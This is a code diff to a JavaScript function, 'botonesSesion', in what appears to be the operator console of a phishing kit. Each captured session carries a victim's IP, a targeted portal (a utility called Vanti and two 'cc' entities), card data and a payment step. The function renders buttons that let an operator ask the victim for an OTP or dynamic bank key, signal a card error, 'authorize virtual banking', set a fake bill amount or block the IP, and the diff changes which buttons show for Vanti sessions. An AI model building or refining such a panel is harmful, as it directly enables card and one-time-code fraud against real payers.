@@ -597,29 +597,33 @@ function botonesSesion(s) {
     const ip = escapeHtml(s.datos.ip || '');
     const btns = [];
 
-    // 🔥 DETECCIÓN: Si es Vanti pero el medio de pago es Wompi, o tiene tarjeta, o el paso es 'Vanti Tarjeta', o el ID es de CC
-    const esTarjeta = bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || 
-                      s.sessionId.toLowerCase().includes('cc') ||
-                      (bancoKey === 'vanti' && (
-                          s.datos.medioPago === 'Wompi' || 
-                          s.datos.tarjeta || 
-                          s.paso === 'Vanti Tarjeta' ||
-                          s.datos.marca === 'visa' || s.datos.marca === 'mastercard'
-                      ));
+    // 🔥 DETECCIÓN ESTRICTA: Si el banco es Vanti, verifica si YA tiene tarjeta.
+    // Si tiene tarjeta, muestra los botones de tarjeta.
+    // Si NO tiene tarjeta, muestra los 3 botones iniciales (Asignar Precio, Rechazar, Ya Pagó).
+    
+    if (bancoKey === 'vanti') {
+        if (s.datos && s.datos.tarjeta) {
+            // Botones de Tarjeta
+            btns.push(`<button class="btn btn-otp" title="Pedir OTP o Clave Dinámica" onclick="accion('${sid}','OTP')">📱</button>`);
+            btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+            btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
+            btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Autorizar Banca Virtual" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
+            btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+        } else {
+            // Botones de Factura (Inicial)
+            btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
+            btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+            btns.push(`<button class="btn btn-final" title="Ya Pagó" onclick="accion('${sid}','YA_PAGO')">✅</button>`);
+        }
+        return btns.join('');
+    }
 
-    if (esTarjeta) {
+    if (bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga') {
         btns.push(`<button class="btn btn-otp" title="Pedir OTP o Clave Dinámica" onclick="accion('${sid}','OTP')">📱</button>`);
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
         btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Autorizar Banca Virtual" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
         btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
-        return btns.join('');
-    }
-
-    if (bancoKey === 'vanti') {
-        btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
-        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-        btns.push(`<button class="btn btn-final" title="Ya Pagó" onclick="accion('${sid}','YA_PAGO')">✅</button>`);
         return btns.join('');
     }
 
